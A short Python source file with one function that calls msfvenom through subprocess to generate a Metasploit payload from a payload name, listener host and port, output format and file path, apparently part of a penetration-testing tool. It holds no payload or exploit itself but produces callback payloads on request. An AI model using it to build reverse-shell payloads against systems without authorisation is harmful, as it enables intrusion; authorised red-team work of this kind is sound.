import subprocess

def generate_payload(payload, lhost, lport, fmt, output_path):
    try:
        cmd = [
            "msfvenom",
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", fmt,
            "-o", output_path
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout if result.returncode == 0 else result.stderr

    except Exception as e:
        return f"[!] Exception: {e}"
